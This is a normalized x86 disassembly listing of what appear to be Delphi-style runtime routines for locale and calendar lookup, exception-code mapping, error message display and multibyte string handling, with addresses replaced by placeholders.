cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b86c
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404480
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b86c
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404480
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9c2
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404450
retn
sub_40b9cc
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40461c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ba08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40ba6d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40461c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408b2c
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba74
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
inc ebx
sub_40ba80
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40bb17
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b7f8
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408b2c
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb1e
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b9cc
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ba08
call EnumCalendarInfoA
sub_40bb30
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40bcfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_40442c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b7f8
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408b2c
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4046e4
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd01
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404450
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4090fc
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ca54
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_40493c
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4046ec
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_404480
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4090fc
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4046ec
inc ebx
jmp r-xdata
mov eax esi
call sub_4046e4
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4090fc
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4046ec
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4046ec
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4046ec
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40460c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4046ec
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40460c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4046ec
sub_40bd64
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40bd58
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40cca8
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_409020
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405b90
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403610
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4096f0
mov eax [ ebp - 0x4 ]
call sub_408f90
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4048dc
mov ebx eax
mov eax ebx
call sub_408f90
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40beec
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40bd64
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405b90
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402e08
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408f90
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff5
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40bfa0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404480
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bfdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40c036
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_409730
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c03d
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
add esp 0xfffffff0
call sub_403a24
sub_40c03d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_40c05c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_406660
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_40c098
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40c104
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_406660
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_409730
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c10b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
add esp 0xfffffff0
call sub_403a24
sub_40c10b
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_40c158
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028dc
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40c1b8
mov esp 0xe0040c1
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403e8c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bfa0
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40c158
mov edx eax
sub_40c22c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40c2c8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4044c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c2cf
lea eax [ ebp - 0x20 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_40c31c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40c3b4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c56f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404694
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408e9c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c576
lea eax [ ebp - 0x170 ]
call sub_40442c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404450
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_40c580
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c63b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40c31c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bfa0
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push ebp
call sub_40c3b4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c642
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
mov ebx eax
sub_40c65c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c64c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40c39c
mov eax [ rw-data ]
mov [ eax ] sub_40c580
mov eax sub_40c2e8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40c304
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c6e0
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4036c0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
sub_40c74c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404694
sub_40c7a4
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c81c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4048dc
mov edx esi
dec edx
call sub_40c7a4
sub_40c858
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4046e4
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c880
pop esi
pop ebx
retn
mov eax ebx
call sub_4046e4
mov esi eax
sub_40c880
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4046e4
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40ca90
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c8d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4046e4
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40ca90
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40ca90
dec eax
mov ebx eax
sub_40c968
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4046e4
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c8d8
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4046e4
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c9cc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4046e4
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4046e4
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c8d8
mov eax esi
call sub_4046e4
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4046e4
mov [ esp ] eax
jmp r-xdata
sub_40ca54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4048dc
add eax esi
dec eax
call sub_40ca2c
sub_40ca90
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4048dc
add eax ebx
dec eax
call sub_40ca2c
add eax ebx
sub_40cacc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4046e4
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c81c
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40cb00
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4046e4
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c81c
test al al
jne r-xdata
mov eax ebp
call sub_4048dc
mov dl [ esi + edi - 0x1 ]
call sub_409140
test eax eax
setne bl
sub_40cb44
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4048dc
push eax
mov eax esi
call sub_4048dc
mov ebp eax
mov eax ebp
pop edx
call sub_40cc08
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40cb7c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_408794
mov eax esi
call sub_4046e4
mov ebp eax
mov eax edi
mov edx ebp
call sub_404a68
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4048e8#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4048e8#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4048e8#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40cc08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408f90
mov [ esp ] eax
mov eax ebp
call sub_408f90
mov edi eax
mov edx ebp
mov eax esi
call sub_409160
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c840
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_409160
mov ebx eax
inc ebx
sub_40cca8
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40ccd0
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40ccd0
test eax eax
jne r-xdata
sub_40ccd0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_409140
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c840
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
